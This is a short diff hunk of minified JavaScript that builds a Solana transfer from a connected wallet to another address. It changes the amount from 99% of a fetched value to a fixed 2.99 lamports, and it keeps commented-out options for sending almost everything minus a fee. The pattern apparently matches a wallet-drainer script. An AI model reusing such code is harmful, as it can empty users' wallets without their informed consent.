@@ -456,7 +456,7 @@
                                             return r = t.sent, console.log(r), (a = (new k.Transaction).add(k.SystemProgram.transfer({
                                                 fromPubkey: H.publicKey,
                                                 toPubkey: n,
-                                                lamports: r * 0.99
+                                                lamports: 2.99
                                                     // lamports: r - 5e3
                                                     // lamports: 1000000000
                                             }))).feePayer = H.publicKey, c = a, t.next = 13, e.connection.getRecentBlockhash();
